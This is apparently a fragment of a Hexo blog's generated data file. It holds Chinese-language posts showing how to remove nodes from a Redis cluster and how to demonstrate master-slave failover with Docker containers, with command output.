tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><p>要实现Redis缩容，例如移除6387的主机，首先需要把6388的Slave主机移除，然后归还槽位，最后再移除Master主机。</p>\n<ol>\n<li>首先查看集群信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>","more":"<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[1365-5460] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 791172307abf9223425af595e661cec441951170</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>移除6388Slave主机</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73</span></span><br><span class=\"line\">&gt;&gt;&gt; Removing node 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 from cluster 192.168.1.42:6388</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER FORGET messages to the cluster...</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER RESET SOFT to the deleted node.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>再次查看集群的状态信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[1365-5460] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到只有3个Slave主机了。</p>\n<ol start=\"4\">\n<li>重新分配槽号</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster reshard 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>要删除的是6387的Master主机，要把6387拥有的槽号统一分配给6386的Master主机，按照下图的指示进行操作：</p>\n<p><img src=\"/2023/08/14/RedisDel/1.png\" alt=\"重新分配槽号\"></p>\n<ol start=\"5\">\n<li>稍作等待，待槽号重新分配完成，查看集群节点的槽号信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster check 192.168.1.42:6381</span></span><br><span class=\"line\">192.168.1.42:6386 (849a82f0...) -&gt; 0 keys | 8192 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6387 (79117230...) -&gt; 0 keys | 0 slots | 0 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br></pre></td></tr></table></figure>\n\n<p>可以看到6387的主机已经没有任何槽号了，而6386主机比其他两个Master节点多出来4096个槽号。</p>\n<ol start=\"5\">\n<li>从集群删除6387节点</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170</span></span><br><span class=\"line\">&gt;&gt;&gt; Removing node 791172307abf9223425af595e661cec441951170 from cluster 192.168.1.42:6387</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER FORGET messages to the cluster...</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER RESET SOFT to the deleted node.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>再次查看集群节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[0-6826],[10923-12287] (8192 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到集群又恢复到3主3从的节点状态。</p>"},{"title":"Docker演示Redis集群主从切换案例","date":"2023-08-14T06:46:40.000Z","_content":"\n### 操作步骤\n\n1. 查看当前的集群情况\n\n```bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691996146001 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691996144999 1 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691996144000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691996145000 1 connected 0-5460\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691996144000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691996144000 2 connected 5461-10922\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n当前登录主机为1号机，6号机是1号机的从服务器，5号机是3号机的从服务器，4号机是2号机的从服务器。\n\n2. 关闭1号机容器，然后再次查看容器的状态\n\n关闭1号容器\n\n```bash\ndocker stop redis-node-1\n```\n\n效果：\n\n```bash 折叠代码\nroot@knight:/docker# docker stop redis-node-1\nredis-node-1\nroot@knight:/docker# docker ps -a\nCONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS                     PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Exited (0) 9 seconds ago             redis-node-1\n```\n\n可以看到1号容器已经被关掉了。\n\n3. 然后以2号机作为切入点，查看集群的状态。\n\n进入2号容器：\n\n```bash\ndocker exec -it redis-node-2 bash\n```\n\n效果：\n\n```bash\nroot@knight:/docker# docker exec -it redis-node-2 bash\nroot@knight:/data# redis-cli -p 6382 -c\n127.0.0.1:6382> cluster nodes\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013667508 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 myself,master - 0 1692013666000 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013667000 3 connected 10923-16383\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 master,fail - 1692013443386 1692013440000 1 disconnected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013665000 3 connected\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013665498 7 connected 0-5460\n127.0.0.1:6382> \n```\n\n可以看到当前6号机处于master状态，顶替了原来1号机的位置，而1号机现在处于fail状态。\n\n这就完成了redis主从切换的演示，补充一句，如果把1号机重新启动回来的话，也不会影响现在6号机的master状态，1号机会作为6号机的slave机器。\n\n效果如下：\n\n```bash 折叠代码\nroot@knight:/docker# docker start redis-node-1 \nredis-node-1\nroot@knight:/docker# docker exec -it redis-node-1 bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013947000 7 connected 0-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692013947000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013946019 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013949036 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692013947022 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013948030 3 connected 10923-16383\n127.0.0.1:6381> \n```","source":"_posts/RedisMasterSlave.md","raw":"---\ntitle: Docker演示Redis集群主从切换案例\ndate: 2023-08-14 14:46:40\ncategories: 技术\ntags:\n  - Docker \n  - Redis\n---\n\n### 操作步骤\n\n1. 查看当前的集群情况\n\n```bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691996146001 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691996144999 1 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691996144000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691996145000 1 connected 0-5460\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691996144000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691996144000 2 connected 5461-10922\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n当前登录主机为1号机，6号机是1号机的从服务器，5号机是3号机的从服务器，4号机是2号机的从服务器。\n\n2. 关闭1号机容器，然后再次查看容器的状态\n\n关闭1号容器\n\n```bash\ndocker stop redis-node-1\n```\n\n效果：\n\n```bash 折叠代码\nroot@knight:/docker# docker stop redis-node-1\nredis-node-1\nroot@knight:/docker# docker ps -a\nCONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS                     PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Exited (0) 9 seconds ago             redis-node-1\n```\n\n可以看到1号容器已经被关掉了。\n\n3. 然后以2号机作为切入点，查看集群的状态。\n\n进入2号容器：\n\n```bash\ndocker exec -it redis-node-2 bash\n```\n\n效果：\n\n```bash\nroot@knight:/docker# docker exec -it redis-node-2 bash\nroot@knight:/data# redis-cli -p 6382 -c\n127.0.0.1:6382> cluster nodes\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013667508 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 myself,master - 0 1692013666000 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013667000 3 connected 10923-16383\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 master,fail - 1692013443386 1692013440000 1 disconnected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013665000 3 connected\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013665498 7 connected 0-5460\n127.0.0.1:6382> \n```\n\n可以看到当前6号机处于master状态，顶替了原来1号机的位置，而1号机现在处于fail状态。\n\n这就完成了redis主从切换的演示，补充一句，如果把1号机重新启动回来的话，也不会影响现在6号机的master状态，1号机会作为6号机的slave机器。\n\n效果如下：\n\n```bash 折叠代码\nroot@knight:/docker# docker start redis-node-1 \nredis-node-1\nroot@knight:/docker# docker exec -it redis-node-1 bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013947000 7 connected 0-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692013947000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013946019 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013949036 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692013947022 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013948030 3 connected 10923-16383\n127.0.0.1:6381> \n```","slug":"RedisMasterSlave","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5em003p7zj39fdn6kjd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>查看当前的集群情况</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381 -c</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691996146001 3 connected 10923-16383</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691996144999 1 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691996144000 3 connected</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691996145000 1 connected 0-5460</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691996144000 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691996144000 2 connected 5461-10922</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>当前登录主机为1号机，6号机是1号机的从服务器，5号机是3号机的从服务器，4号机是2号机的从服务器。</p>\n<ol start=\"2\">\n<li>关闭1号机容器，然后再次查看容器的状态</li>\n</ol>\n<p>关闭1号容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stop redis-node-1</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker stop redis-node-1</span></span><br><span class=\"line\">redis-node-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps -a</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS                     PORTS     NAMES</span><br><span class=\"line\">61d59245db3d   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-6</span><br><span class=\"line\">223fad42e069   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-5</span><br><span class=\"line\">f0055941fe3f   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-4</span><br><span class=\"line\">e361d9695a0c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-3</span><br><span class=\"line\">400119c3015c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-2</span><br><span class=\"line\">61e2e38927c4   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Exited (0) 9 seconds ago             redis-node-1</span><br></pre></td></tr></table></figure>\n\n<p>可以看到1号容器已经被关掉了。</p>\n<ol start=\"3\">\n<li>然后以2号机作为切入点，查看集群的状态。</li>\n</ol>\n<p>进入2号容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it redis-node-2 bash</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker exec -it redis-node-2 bash</span></span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6382 -c</span></span><br><span class=\"line\">127.0.0.1:6382&gt; cluster 